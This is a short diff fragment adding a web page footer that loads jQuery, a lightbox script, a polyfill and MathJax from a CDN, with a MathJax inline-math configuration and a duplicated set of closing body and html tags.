+		  <footer>
+  <script src="../../js/jquery-latest.js"></script>
+<script src="../../js/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+</script>
+  
+  </footer>
+  </body>
+</html>
+
+	</body>
+</html>
